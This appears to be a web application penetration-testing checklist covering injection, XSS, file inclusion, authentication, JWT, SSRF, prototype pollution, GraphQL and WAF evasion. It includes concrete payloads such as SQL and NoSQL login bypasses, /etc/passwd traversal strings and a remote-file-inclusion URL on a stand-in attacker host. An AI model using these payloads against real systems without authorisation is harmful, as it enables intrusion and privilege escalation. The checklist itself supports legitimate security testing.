# Methodology checks 

#### Fuzzing

* [ ] Fuzz all endpoints (API, directories, internal addresses, file extensions…)
  * [ ] If an API is like `/api/v1/my-profile` , don’t forget to also fuzz `/api/FUZZ/my-profile`
* [ ] robots.txt
* [ ] Also look for .php, .html, .txt,…
* [ ] Check for WAF  `wafw00f <URL>` .
* [ ] Overexposure from endpoints (returning too much data).

#### SQLi

* [ ] Test `‘` and `“` and nothing.
* [ ] Test with `ORDER BY 1-20 -- -` to figure out the number of returned columns
* [ ] Test with `UNION SELECT null, null, ...`
* [ ] Test with `UNION SELECT 1,2,3, ...`&#x20;
* [ ] Test previous 3 and without URL encoding ( `+` and `%20` are NOT the same)
* [ ] Test with SQLMap.
* [ ] Test for login bypass with `' and 1=1-- -`
* [ ] Test for blind SQLi.
* [ ] Test for second-order SQLi.
* [ ] Test for NoSQLi
  * [ ] Different operators: `$eq, $ne, $gt, $gte, $lt, $lte`
  * [ ] Test for login bypass: `{"username": "anyname", "password": {"$ne": ""}}`
  * [ ] Test for id bypass: `http://localhost/v1/api?id[$ne]=null`

#### XSS

* [ ] Is your input reflected in the response?
* [ ] Can we use events (onload, onerror)?
* [ ] Is your input stored and later rendered?
* [ ] Fuzz for tags and attributes that are allowed.
* [ ] Is there a `href`attribute that can be misused? (`javascript:alert()` )
* [ ] Do you see `document.script`inside the codebase?
* [ ] Do you see `script`tags in the response?
* [ ] Can you inject a `<base href>` tag to change how relative URLs resolve?
* [ ] Can you make the payload bigger by adding 10.000 characters? (WAF evasion)
* [ ] Can you add special characters and see if they’re filtered? (`”’testing§&%*;#{}`)
* [ ] If filtered, does `<scrscriptipt>prompt()</scriscriptpt>` work?

#### File Inclusion

* [ ] Make sure Burp Suite has turned of the filter for CSS and images.
* [ ] Test for LFI
  * [ ] Can you access local files (../../../etc/passwd).
  * [ ] Test with obfuscation (….//….//….//etc/passwd).
  * [ ] Test for null byte injection (../../../etc/passwd%00).
  * [ ] Test for protocol wrappers (php\://, data://).
* [ ] Test for RFI
  * [ ] Can you include remote files (<http://hacker.com/malicious.php>)
  * [ ] Test with obfuscation (hthttptp\://hacker.com/malicious.php)
* [ ] Can you achieve RCE?
  * [ ] Going to a php file you uploaded?
* [ ] Is a part of the path ‘obligated’? (e.g. `var/www/html/../../../etc/passwd` )

#### XXE

* [ ] Identify endpoints that can process XML.
* [ ] Identify endpoints that accept SVG or DOCX.
* [ ] Try an XInclude attack.
* [ ] If XXE is possible, check for opportunities to perform SSRF.

#### Attacking authentication

* [ ] Can we enumerate usernames
  * [ ] Difference in response time with a user we know exists and one we know does not exist.
    * [ ] `select * from users where username = 'idpnt' union select 1 as id, 'alice' as username, '123' as password`
  * [ ] Difference in response time with large passwords on login
  * [ ] Slight differences in response length
  * [ ] Use an full exact fail message as a reverse search
  * [ ] Registering a username that we know exists
* [ ] Check password reset
* [ ] Check keep logged in functionality
* [ ] Test for brute force protection
  * [ ] Can we spoof headers (X-Real-IP, X-Forwarded-For, X-Originating-IP, Client-IP, True-Client-IP)
* [ ] Check for MFA
  * [ ] Check if token can be brute forced
  * [ ] Try SQLi on MFA token
  * [ ] Can you force the endpoint you want to reach by skipping some steps. (e.g go to (user-dashboard after logging in but before entering a MFA)
  * [ ] Check if the MFA works on different users.
* [ ] Default credentials
* [ ] Check tokens
  * [ ] Sequencer for predictability
  * [ ] Signature on JWT
    * [ ] Is it possible to send an unsigned token?
    * [ ] Signature “none” attack.
    * [ ] Is it possible to crack the signature with hashcat or jwt\_tool?

#### Command injection

* [ ] Test for simple injections with ;, &&, || and |.
* [ ] Test for blind injection. Use ping or curl.
* [ ] Test with a list of potentially dangerous functions/methods (like exec(), system(), passthru() in PHP, or exec, eval in Node.js).

#### SSTI

* [ ] Is a input reflected on the response?
* [ ] If the payload is not working on the frontend, make sure to check also the response in Burp.

#### CSRF

* [ ] Does every form has a CSRF token?
* [ ] Test with a random token
* [ ] Can we use GET instead of POST (can our payload be in the URI instead of the body)?

#### SSRF

* [ ] Identify all points where the application makes a server-side HTTP request (body, headers, parameters).
* [ ] Does the application accept IP addresses or localhost as hostname?
* [ ] Map out internal endpoints (fuzzing).
* [ ] Alternative IP notation (e.g. 127.0.0.1 in hex is 0x7f.0x0.0x0.0x1).

#### Insecure File Upload

* [ ] Are there file type restrictions?
* [ ] Test for bypassing file extension filters (.phtml, php5)
* [ ] Upload a file with double extension (.jpg.php)
* [ ] Test for malicious content inside a file (XXE inside a XML upload).
* [ ] Are the uploaded files accessible trough an URL?
* [ ] Can others access the uploaded files?

#### Broken Access Control

* [ ] Check for ID’s inside requests.
* [ ] Forceful browsing (go straight to /admin)
* [ ] Can we perform actions on pages we were not supposed to reach? (/admin is protected, but /admin-roles is not)
* [ ] Check if you can use functionality that’s not inside your authorization?
  * [ ] Change a GET request to a PUT and try changing it values that it returns. (eg, use a PUT on a GET userStat and change the stats of a different user)
  * [ ] Can you change the ID on a DELETE endpoint so you end up deleting a post you’re not supposed to?
* [ ] Decode tokens and see if you can change them.

#### JWT

* [ ] Can you use the request without the token?
* [ ] Can you use a unsigned token?
* [ ] Can you change the payload (different user)?
* [ ] Is signature ‘none’ attack possible?
* [ ] Can you crack the token itself (hashcat or jwt\_tool)?
* [ ] Can you use header injection?
* [ ] Analyse JWT with jwt\_tool.
* [ ] Can you use a JWT of a low level user to perform high level actions?

#### Token

* [ ] Is the token Base64?
* [ ] Can Sequencer do an analysis (don’t forget to enable base64-decode before analyzing if applicable)
* [ ] Can you forge a token on basis of Sequencer results?

#### Websockets

* [ ] Check in response for `upgrade: Websocket`
* [ ] WebSocket Hijacking
  * [ ] Handshake relies on cookies.
  * [ ] No CSRF token.
  * [ ] Same site cookie is ‘None’.

#### Mass assignment

* [ ] Check for leaky endpoints.
* [ ] Check JWT (eg `“role”:”admin”`).
* [ ] Code review (spread operators).

#### Open Redirect

* [ ] check frontend code for redirects (on click —> location.href).
* [ ] check URL for a redirect.

#### Race conditions

* [ ] Is there a multi-step process (so you can hammer step 2)?
* [ ] Check if a duplicate action is allowed (apply, redeem, confirm,…)
* [ ] Are there coupon, voucher, gift-card redeem endpoints?
* [ ] Is there a reset email functionality?

#### API

* [ ] Can you use other HTTP methods?
* [ ] Fuzz the APIs (eg if there is `api/v1/checkout` check if there is `api/v2/checkout`, but don’t forget to check all the different parameters).

#### Prototype Pollution

* [ ] Can you change the objects’ parameter with `{"__proto__":{"isAdmin":true}}`
* [ ] Can you change the URL parameter with `?__proto__[isAdmin]=true`
  * [ ] If successful, create a payload and URL encode it.
* [ ] Consult DOM Invader.
* [ ] Use Burp extension for server-side pollution
* [ ] Consider filters. `__pro__proto__to__` might work.
* [ ] Look for `eval()` ,`document.createElement()` , `innerHTML`, `Object.assign()`
* [ ] Look for URL parameters in the code.

#### GraphQL

* [ ] Fuzz the application to find extra endpoints, query or mutation fields.
  * [ ] Use the endpoints list.
  * [ ] Write down all mutation/queries and ask ChatGPT to make a list with potential hidden names.
* [ ] Is Introspection possible?
  * [ ] Put the introspection into <https://apis.guru/graphql-voyager/>.
* [ ] Information Disclosure
  * [ ] Can we query extra fields?
  * [ ] Use field suggestion to discover more fields.
  * [ ] Use field stuffing to discover more fields.
* [ ] Batch attack possible?
* [ ] Injection attacks, CSRF, IDOR, BAC, and other web attacks?

#### WAF

* [ ] Can you add a bunch of data before the payload?
* [ ] Can you encode the payload?
* [ ] Can you obfuscate the payload?
